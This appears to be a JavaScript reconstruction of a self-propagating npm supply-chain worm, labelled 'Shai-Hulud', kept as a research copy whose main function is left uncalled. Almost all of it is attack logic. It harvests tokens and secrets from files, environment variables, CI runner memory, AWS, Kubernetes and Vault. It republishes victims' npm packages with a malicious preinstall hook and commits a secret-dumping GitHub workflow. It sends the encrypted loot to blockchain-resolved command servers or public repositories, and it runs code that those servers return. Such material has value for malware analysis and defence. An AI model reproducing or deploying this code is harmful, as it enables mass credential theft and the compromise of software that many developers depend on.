const CONFIG = {
  ethereumContract: "0xE1f2395ee43e45A1556EC6438a88c31B83493103",
  ethereumSelector: "0x53ed5143",
  c2Port: 443,
  c2Path: "router",
  dryRun: false,
  batchSizeBytes: 102400,
  lockFile: "/tmp/tmp.dpkg_14527.lock",
  childMarker: "_NODE_RUNTIME_INIT",
  propagatedPayloadName: "math_init.js",
  propagatedLoaderName: "setup.mjs",
  githubExfilDescription: "Shai-Hulud: Here We Go Again",
  githubTokenMarker:
    "IfYouBlockThisAPIKeyItWillCrashTheLiveProductionServersOfAllThirdPartyClients",
  signedCommitMarker: "thebeautifulmarchoftime ",
};

const TOKEN_PATTERNS = {
  npm: /npm_[A-Za-z0-9]{36,}/g,
  github: /gh[op]_[A-Za-z0-9_.-]{36,}/g,
  githubActionsJwt: /ghs_\d+_[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g,
  githubActionsLegacy: /ghs_[A-Za-z0-9]{36,}/g,
  awsAccessKey: /AKIA[0-9A-Z]{16}/g,
  vault: /hvs\.[A-Za-z0-9_-]{24,}/g,
  privateKey: /-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----/g,
  databaseUrl: /(mongodb|mysql|postgresql|postgres|redis):\/\/[^\s]+/gi,
  secretAssignment:
    /["']?(password|passwd|pass|pwd|secret|token|key|api[_-]?key|auth)["']?\s*["':=]\s*["'][^"'{}\s]{4,}["']/gi,
};

const AWS_REGIONS = [
  "us-east-1", "us-east-2", "us-west-1", "us-west-2",
  "ap-northeast-1", "ap-northeast-2", "ap-northeast-3",
  "ap-south-1", "ap-southeast-1", "ap-southeast-2",
  "ca-central-1", "eu-central-1", "eu-north-1",
  "eu-west-1", "eu-west-2", "eu-west-3", "sa-east-1",
];

const FILE_TARGET_GROUPS = {
  cloud: ["AWS", "Azure", "GCP", "Kubernetes", "Vault", "Terraform"],
  development: ["Git", "GitHub CLI", "npm", "Yarn", "PyPI", "Docker", "SSH"],
  aiTools: ["OpenAI", "Codex", "Anthropic", "Claude", "Cursor", "Gemini"],
  ciAndServers: ["Jenkins", "CircleCI", "ArgoCD", "Harbor", "Zabbix"],
  wallets: ["Bitcoin", "Ethereum", "Electrum", "Monero", "Solana"],
  desktopApps: ["Slack", "Discord", "Telegram", "Signal", "FileZilla"],
  system: ["shell histories", "/etc/shadow", "/proc/self/environ"],
};

class CollectorResult {
  constructor(provider, service, data, patterns = {}) {
    this.provider = provider;
    this.service = service;
    this.success = data !== undefined;
    this.data = data;
    this.size = byteLength(serialize(data));
    this.matches = findPatternMatches(serialize(data), patterns);
  }
}

class Collector {
  constructor(provider, service, patterns = {}) {
    this.provider = provider;
    this.service = service;
    this.patterns = patterns;
  }

  success(data) {
    return new CollectorResult(this.provider, this.service, data, this.patterns);
  }

  failure(message) {
    return {
      provider: this.provider,
      service: this.service,
      success: false,
      error: message,
      size: 0,
    };
  }

  async streamInto(resultBuffer) {
    try {
      const result = await this.execute();
      resultBuffer.ingest(result);
    } catch (error) {
      resultBuffer.ingest(this.failure(String(error)));
    }
  }
}

class NpmPackagePropagator {
  constructor(validatedToken) {
    this.token = validatedToken.authToken;
    this.packages = validatedToken.packages;
  }

  async execute() {
    if (!['darwin', 'linux'].includes(process.platform)) return;

    const temporaryDirectory = await createTemporaryDirectory();
    try {
      for (const packageName of this.packages) {
        const originalTarball = await downloadLatestNpmTarball(packageName);
        const infectedTarball = await this.rewriteTarball(originalTarball);
        await publishNpmTarball(infectedTarball, this.token);
      }
    } finally {
      await removeRecursively(temporaryDirectory);
    }
  }

  async rewriteTarball(tarballPath) {
    const workDirectory = await extractTarGzip(tarballPath);
    const manifestPath = join(workDirectory, "package", "package.json");
    const loaderPath = join(workDirectory, "package", CONFIG.propagatedLoaderName);
    const payloadPath = join(workDirectory, "package", CONFIG.propagatedPayloadName);
    const manifest = JSON.parse(await readText(manifestPath));

    await copyFile(require.main, payloadPath);
    await writeText(loaderPath, EMBEDDED_BUN_LOADER);

    manifest.scripts = { preinstall: "node setup.mjs" };
    manifest.version = incrementPatchVersion(manifest.version);
    await writeText(manifestPath, JSON.stringify(manifest, null, 2));

    return createTarGzip(workDirectory, "package");
  }
}

async function validateNpmTokenAndListWritablePackages(token) {
  const authorization = { Authorization: `Bearer ${token}` };
  let pageUrl = "https://registry.npmjs.org/-/npm/v1/tokens";
  let tokenRecord = null;

  while (pageUrl && !tokenRecord) {
    const page = await fetchJson(pageUrl, { headers: authorization });
    tokenRecord = page.objects?.find((record) =>
      record.bypass_2fa === true &&
      record.token?.startsWith(token.slice(0, 4)) &&
      record.token?.endsWith(token.slice(-4)),
    );
    pageUrl = page.urls?.next ?? null;
  }

  if (!tokenRecord || !hasPackageWritePermission(tokenRecord)) {
    return { authToken: token, valid: false, packages: [] };
  }

  const username = (await fetchJson("https://registry.npmjs.org/-/whoami", {
    headers: authorization,
  })).username;

  const packages = new Set();
  await addWritableOrganizationPackages(packages, tokenRecord, authorization);
  await addExplicitPackageScopes(packages, tokenRecord, authorization);
  await addMaintainedPackages(packages, username, authorization);

  return { authToken: token, valid: true, packages: [...packages] };
}

class ResultBuffer {
  constructor(dispatch) {
    this.dispatch = dispatch;
    this.results = [];
    this.bytes = 0;
    this.inFlight = new Set();
  }

  ingest(result) {
    if (!result.success) return;

    for (const token of result.matches?.npm ?? []) {
      const propagation = validateNpmTokenAndListWritablePackages(token)
        .then((validated) => new NpmPackagePropagator(validated).execute());
      this.inFlight.add(propagation);
      propagation.finally(() => this.inFlight.delete(propagation));
    }

    this.results.push(result);
    this.bytes += result.size;
    if (this.bytes >= CONFIG.batchSizeBytes) this.flush();
  }

  flush() {
    if (this.results.length === 0) return;
    const batch = this.results;
    this.results = [];
    this.bytes = 0;

    const send = this.dispatch(batch);
    this.inFlight.add(send);
    send.finally(() => this.inFlight.delete(send));
  }

  async finalize() {
    this.flush();
    await Promise.all(this.inFlight);
  }
}

class SenderDispatcher {
  constructor(senders) {
    this.senders = senders.filter(Boolean);
  }

  async dispatch(results) {
    if (results.length === 0 || this.senders.length === 0) return;
    const envelope = await this.senders[0].createEnvelope(results);

    for (const sender of this.senders) {
      try {
        if (!(await sender.healthy())) continue;
        await sender.send(envelope);
        return;
      } catch {}
    }
  }
}

class ShellEnvironmentCollector extends Collector {
  constructor() {
    super("shell", "misc", {
      npm: TOKEN_PATTERNS.npm,
      github: TOKEN_PATTERNS.github,
    });
  }

  async execute() {
    let githubToken;
    try {
      githubToken = execute("gh auth token").trim();
    } catch {}
    return this.success({ githubToken, environment: process.env });
  }
}

class FilesystemCollector extends Collector {
  constructor() {
    super("filesystem", "hotspots", TOKEN_PATTERNS);
    this.maxFileSize = 5 * 1024 * 1024;
  }

  async execute() {
    const paths = expandConfiguredGlobs(FILE_TARGET_GROUPS, process.platform);
    const files = {};

    for (const path of paths) {
      const stat = await safeStat(path);
      if (!stat?.isFile() || stat.size > this.maxFileSize) continue;
      files[path] = await readText(path);
    }

    return this.success({ hotspots: files });
  }
}

class GitHubRunnerMemoryCollector extends Collector {
  constructor() {
    super("github", "runner", TOKEN_PATTERNS);
  }

  async execute() {
    if (process.env.GITHUB_ACTIONS !== "true") return this.failure("Not Actions");
    if (process.env.RUNNER_OS !== "Linux") return this.failure("Not Linux");

    const memoryReader = EMBEDDED_RUNNER_MEMORY_PYTHON;
    const output = execute(
      "sudo python3 | tr -d '\\0' | " +
      "grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' | sort -u",
      { input: memoryReader },
    );

    return this.success({
      repository: process.env.GITHUB_REPOSITORY,
      workflow: process.env.GITHUB_WORKFLOW,
      secrets: parseRunnerSecrets(output, { exclude: ["github_token"] }),
    });
  }
}

class GitHubActionsSecretCollector extends Collector {
  constructor(token) {
    super("github", "actions", {
      npm: TOKEN_PATTERNS.npm,
      github: TOKEN_PATTERNS.github,
    });
    this.token = token;
  }

  async execute() {
    if (!(await inspectGitHubToken(this.token)).hasWorkflowScope) {
      return this.failure("Missing workflow scope");
    }

    const repositories = await listPushableRepositories(this.token, {
      pushedSince: "2025-09-01T00:00:00Z",
      limit: 100,
    });

    const results = [];
    for (const repository of repositoriesWithActionSecrets(repositories)) {
      const branch = "dependabot/github_actions/format/setup-formatter";
      const workflowPath = ".github/workflows/codeql_analysis.yml";
      let runId;

      try {
        await createBranch(repository, branch);
        await commitFile(repository, branch, workflowPath, SECRET_DUMP_WORKFLOW);
        runId = await waitForWorkflowRun(repository, branch);
        await waitForWorkflowCompletion(repository, runId);
        const artifact = await downloadArtifact(repository, runId, "format-results");
        results.push({ repository: repository.fullName, artifact });
      } finally {
        if (runId) await deleteWorkflowRun(repository, runId);
        await deleteBranch(repository, branch);
      }
    }

    return results.length ? this.success({ results }) : this.failure("No secrets");
  }
}

const SECRET_DUMP_WORKFLOW = {
  trigger: "push",
  runner: "ubuntu-latest",
  environment: "${{ toJSON(secrets) }}",
  action: "write environment to format-results.txt and upload it as an artifact",
};

class AwsIdentityCollector extends Collector {
  constructor() {
    super("aws", "sts");
  }

  async execute() {
    const providers = [
      environmentCredentials(),
      sharedConfigCredentials(),
      containerMetadataCredentials("http://169.254.170.2"),
      ec2InstanceMetadataCredentials("http://169.254.169.254"),
      ...profileCredentials(),
    ];

    const identities = [];
    for (const provider of providers) {
      try {
        const credentials = await withTimeout(provider.resolve(), 5000);
        const identity = await awsStsGetCallerIdentity(credentials);
        identities.push({ source: provider.label, ...identity });
      } catch {}
    }
    return identities.length ? this.success(identities) : this.failure("No credentials");
  }
}

class AwsSecretsManagerCollector extends Collector {
  constructor() {
    super("aws", "secretsmanager", { npm: TOKEN_PATTERNS.npm });
  }

  async execute() {
    const credentials = await resolveAwsCredentials();
    const secrets = {};

    for (const region of AWS_REGIONS) {
      for (const secretId of await listAllAwsSecrets(credentials, region)) {
        secrets[`${region}:${secretId}`] =
          await getAwsSecretValue(credentials, region, secretId);
      }
    }

    return Object.keys(secrets).length
      ? this.success({ callerIdentity: await awsStsGetCallerIdentity(credentials), secrets })
      : this.failure("No Secrets Manager values");
  }
}

class AwsSsmCollector extends Collector {
  constructor() {
    super("aws", "ssm");
  }

  async execute() {
    const credentials = await resolveAwsCredentials();
    const parameters = {};

    for (const region of AWS_REGIONS) {
      const names = await listAllSsmParameters(credentials, region, { pageSize: 50 });
      for (const batch of chunks(names, 10)) {
        Object.assign(parameters, await getSsmParameters(credentials, region, batch, {
          decrypt: true,
          retries: 3,
          exponentialJitterBaseMs: 500,
        }));
      }
    }

    return Object.keys(parameters).length
      ? this.success({ callerIdentity: await awsStsGetCallerIdentity(credentials), parameters })
      : this.failure("No SSM parameters");
  }
}

class KubernetesSecretsCollector extends Collector {
  constructor() {
    super("kubernetes", "secrets", TOKEN_PATTERNS);
  }

  async execute() {
    const token = process.env.KUBERNETES_SERVICE_HOST
      ? await readText("/var/run/secrets/kubernetes.io/serviceaccount/token")
      : readTokenFromKubeconfig();
    if (!token) return this.failure("No Kubernetes credentials");

    let namespaces = await kubernetesListNamespaces(token);
    if (!namespaces.length) namespaces = [await currentKubernetesNamespace() ?? "default"];

    const ignored = new Set([
      "kube-system", "kube-public", "kube-node-lease",
      "local-path-storage", "cert-manager",
    ]);
    const secrets = [];

    for (const namespace of namespaces) {
      if (ignored.has(namespace)) continue;
      for (const secret of await kubernetesListSecrets(namespace, token)) {
        secrets.push({
          namespace,
          name: secret.metadata?.name,
          type: secret.type ?? "Opaque",
          labels: secret.metadata?.labels ?? {},
          data: decodeBase64Values(secret.data ?? {}),
        });
      }
    }

    return secrets.length ? this.success({ secrets }) : this.failure("No secrets");
  }
}

class VaultSecretsCollector extends Collector {
  constructor() {
    super("vault", "secrets", TOKEN_PATTERNS);
    this.address = process.env.VAULT_ADDR ?? "http://127.0.0.1:8200";
  }

  async execute() {
    const token =
      firstVaultTokenFromEnvironment() ??
      await firstVaultTokenFromKnownFiles() ??
      await authenticateVaultWithKubernetes() ??
      await authenticateVaultWithAwsIam();
    if (!token) return this.failure("No Vault credentials");

    const mounts = await listVaultKvMounts(this.address, token);
    const candidates = unique([...mounts, "secret", "kv", "cubbyhole", "secret-v2"]);
    const secrets = [];

    for (const mount of candidates) {
      const values = await readVaultKvV2(this.address, token, mount, { limit: 100 });
      secrets.push(...(values.length ? values : await readVaultKvV1(
        this.address, token, mount, { limit: 100 },
      )));
    }

    return secrets.length
      ? this.success({ vaultAddress: this.address, secrets: uniqueByPath(secrets) })
      : this.failure("No Vault secrets");
  }
}

class EncryptedSender {
  async createEnvelope(results) {
    const compressed = gzip(JSON.stringify(results));
    const aesKey = randomBytes(32);
    const nonce = randomBytes(12);
    const { ciphertext, authenticationTag } = aes256GcmEncrypt(compressed, aesKey, nonce);
    const encryptedKey = rsaOaepEncrypt(aesKey, EMBEDDED_RSA_PUBLIC_KEY, "sha256");

    return {
      data: concat(nonce, ciphertext, authenticationTag).toString("base64"),
      key: encryptedKey.toString("base64"),
    };
  }
}

class HttpsCommandSender extends EncryptedSender {
  constructor(domain) {
    super();
    this.domain = domain;
    this.name = `https://${domain}:${CONFIG.c2Port}/${CONFIG.c2Path}`;
  }

  async healthy() {
    return domainResolves(this.domain);
  }

  async send(envelope) {
    const response = await httpsPostJson(this.name, {
      ...envelope,
      id: stableHostUuid(),
    });

    if (response?.code) {
      await evaluateJavaScript(response.code);
    }
  }
}

class GitHubRepositorySender extends EncryptedSender {
  constructor(token) {
    super();
    this.token = token;
    this.name = "github-public-repository";
  }

  async healthy() {
    return (await inspectGitHubToken(this.token)).hasRepoScope;
  }

  async send(envelope) {
    const repository = await createPublicGitHubRepository(this.token, {
      name: randomRepositoryName(),
      description: CONFIG.githubExfilDescription,
      issues: false,
      wiki: false,
      discussions: false,
    });

    await commitJsonFiles(repository, "results", envelope, {
      commitMessage: await optionalDoubleBase64TokenMarker(),
    });
    await optionallyInstallGitHubTokenMonitor(repository, EMBEDDED_MONITOR_SHELL);
  }
}

async function resolveC2Domains() {
  const rpcEndpoints = PUBLIC_ETHEREUM_RPC_ENDPOINTS;

  for (const rpc of rpcEndpoints) {
    try {
      const response = await ethereumCall(rpc, {
        to: CONFIG.ethereumContract,
        data: CONFIG.ethereumSelector,
      });
      const domains = decodeAbiStringArray(response.result);
      if (domains.length) return domains;
    } catch {}
  }

  return resolveDomainsFromSignedGitHubCommit({
    searchPhrase: CONFIG.signedCommitMarker,
    publicKey: EMBEDDED_RSA_PUBLIC_KEY,
  });
}

async function bootstrapGitHubToken() {
  const commits = await searchGitHubCommits(CONFIG.githubTokenMarker);

  for (const commit of commits) {
    const match = new RegExp(`^${CONFIG.githubTokenMarker}:([A-Za-z0-9+/]{1,100}={0,3})$`)
      .exec(commit.message ?? "");
    if (!match) continue;

    const token = base64Decode(base64Decode(match[1]));
    if ((await inspectGitHubToken(token)).hasRepoScope) return token;
  }
  return null;
}

async function createSenders(quickResults) {
  const senders = [];
  const domains = await resolveC2Domains();
  if (domains.length) senders.push(new HttpsCommandSender(domains[0]));

  const discoveredTokens = findGitHubTokens(quickResults);
  const githubToken =
    firstValidRepositoryToken(discoveredTokens) ??
    await bootstrapGitHubToken();
  if (githubToken) senders.push(new GitHubRepositorySender(githubToken));

  return senders;
}

async function collectQuickResults() {
  return Promise.all([
    new FilesystemCollector().execute(),
    new ShellEnvironmentCollector().execute(),
    new GitHubRunnerMemoryCollector().execute(),
  ]);
}

async function preflight() {
  await handleSpecialOpenSearchReleaseDrafterCase();
  if (russianLocaleDetected()) exitSuccessfully();

  if (process.env[CONFIG.childMarker] !== "1") {
    respawnDetachedWithEnvironment({ [CONFIG.childMarker]: "1" });
    exitSuccessfully();
  }

  if (!acquireExclusiveLock(CONFIG.lockFile)) exitSuccessfully();
  ignoreSignals(["SIGINT", "SIGTERM"]);
}

async function researchMain() {
  await preflight();

  try {
    const quickResults = await collectQuickResults();
    const senders = await createSenders(quickResults);
    const dispatcher = new SenderDispatcher(senders);
    const resultBuffer = new ResultBuffer(dispatcher.dispatch.bind(dispatcher));

    for (const result of quickResults) resultBuffer.ingest(result);

    const collectors = [
      new AwsSsmCollector(),
      new AwsSecretsManagerCollector(),
      new AwsIdentityCollector(),
      new KubernetesSecretsCollector(),
      new VaultSecretsCollector(),
    ];

    const checkedTokens = new Set();
    for (const token of findGitHubTokens(quickResults)) {
      if (checkedTokens.has(token)) continue;
      checkedTokens.add(token);
      if (await validateGitHubToken(token)) {
        collectors.push(new GitHubActionsSecretCollector(token));
      }
    }

    await Promise.all(collectors.map((collector) => collector.streamInto(resultBuffer)));
    await resultBuffer.finalize();
  } catch {
    // Original top-level control flow suppresses errors.
  } finally {
    releaseLock(CONFIG.lockFile);
    exitSuccessfully();
  }
}

// The recovered sample invokes its top-level function here. This research copy
// deliberately does not call researchMain().
